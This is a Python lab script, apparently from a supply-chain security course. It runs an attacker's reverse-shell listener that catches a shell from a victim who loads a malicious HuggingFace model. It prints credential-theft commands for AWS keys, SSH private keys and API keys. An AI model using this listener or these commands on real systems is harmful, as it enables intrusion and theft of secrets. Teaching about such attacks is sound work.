#!/usr/bin/env python3
"""
Lab 06: Attacker's Listener (Reverse Shell)

This simulates an attacker waiting for a reverse shell connection
from a victim who loads a malicious HuggingFace model.

Run this FIRST, then run victim script from DIFFERENT directory.

Usage: 
  Terminal 1 (Attacker): cd lab-06-supply-chain-attack && python 1_attacker_listener.py
  Terminal 2 (Victim):   cd labs && python lab-06-supply-chain-attack/2_victim_loads_model.py
"""

import socket
import sys
import select
import os
from pathlib import Path
from dotenv import load_dotenv
from rich.console import Console
from rich.panel import Panel

# Load environment variables
load_dotenv(Path(__file__).parent / ".env")

console = Console()

HOST = os.getenv("ATTACKER_HOST", "127.0.0.1")
PORT = int(os.getenv("ATTACKER_PORT", "4444"))

def main():
    console.print(Panel(f"""
[bold red]🏴‍☠️ ATTACKER'S REVERSE SHELL LISTENER[/bold red]

Waiting for a victim to load the malicious HuggingFace model...

[bold]Listening on:[/bold] {HOST}:{PORT}

[yellow]Demo Setup:[/yellow]
  
  [bold]Terminal 1 (You - Attacker):[/bold]
    cd lab-06-supply-chain-attack
    python 1_attacker_listener.py
    
  [bold]Terminal 2 (Victim - different directory!):[/bold]
    cd labs
    python lab-06-supply-chain-attack/2_victim_loads_model.py

When victim loads the model, you get a REAL bash shell on their machine!
Commands like 'pwd', 'history', 'whoami' all work.
""", title="☠️ Attacker View", border_style="red"))

    # Create socket
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((HOST, PORT))
        server.listen(1)
        console.print(f"[dim]Listening on {HOST}:{PORT}...[/dim]\n")
        
        # Wait for connection
        conn, addr = server.accept()
        
        console.print("\n" + "🚨" * 20)
        console.print(f"[bold green]SHELL CONNECTED![/bold green] Victim: {addr[0]}:{addr[1]}")
        console.print("🚨" * 20 + "\n")
        
        console.print(Panel("""
[bold]You now have a REAL bash shell on the victim's machine![/bold]

[cyan]Try these commands:[/cyan]
  pwd                       - See victim's directory (NOT yours!)
  whoami                    - Victim's username  
  history                   - See victim's command history
  cat ~/.aws/credentials    - Steal AWS creds
  cat ~/.ssh/id_rsa         - Steal SSH key
  env | grep -i key         - Find API keys
  
Type 'exit' to disconnect.
""", title="🎯 You Have Shell Access!", border_style="green"))
        
        # Forward I/O between attacker terminal and victim shell
        import termios
        import tty
        
        # Save terminal settings
        old_tty = termios.tcgetattr(sys.stdin)
        
        try:
            # Set terminal to raw mode
            tty.setraw(sys.stdin.fileno())
            conn.setblocking(0)
            
            while True:
                # Check for input from attacker or victim
                r, w, e = select.select([sys.stdin, conn], [], [], 0.1)
                
                if sys.stdin in r:
                    # Attacker typed something - send to victim
                    data = os.read(sys.stdin.fileno(), 1024)
                    if not data:
                        break
                    conn.send(data)
                    
                if conn in r:
                    # Victim shell output - display to attacker
                    try:
                        data = conn.recv(1024)
                        if not data:
                            break
                        sys.stdout.write(data.decode('utf-8', errors='replace'))
                        sys.stdout.flush()
                    except:
                        break
                        
        finally:
            # Restore terminal settings
            termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty)
        
        conn.close()
        console.print("\n[yellow]Connection closed.[/yellow]")
        
    except KeyboardInterrupt:
        console.print("\n[yellow]Listener stopped.[/yellow]")
    except OSError as e:
        console.print(f"[red]Error: {e}[/red]")
        console.print("[yellow]Is another listener already running on this port?[/yellow]")
    finally:
        server.close()

if __name__ == "__main__":
    main()
